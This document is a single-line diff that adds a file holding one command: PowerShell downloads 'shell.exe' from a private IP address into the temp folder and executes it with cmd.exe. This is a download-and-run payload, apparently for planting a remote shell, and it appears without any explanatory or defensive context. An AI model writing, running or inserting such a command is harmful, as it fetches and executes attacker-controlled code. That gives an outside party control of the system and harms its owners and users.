@@ -1,0 +1,1 @@
+powershell -command "((new-object System.Net.WebClient).DownloadFile('http://10.1.1.149/shell.exe', '%TEMP%\shell.exe'))"; "c:\windows\system32\cmd.exe /c %TEMP%\shell.exe"
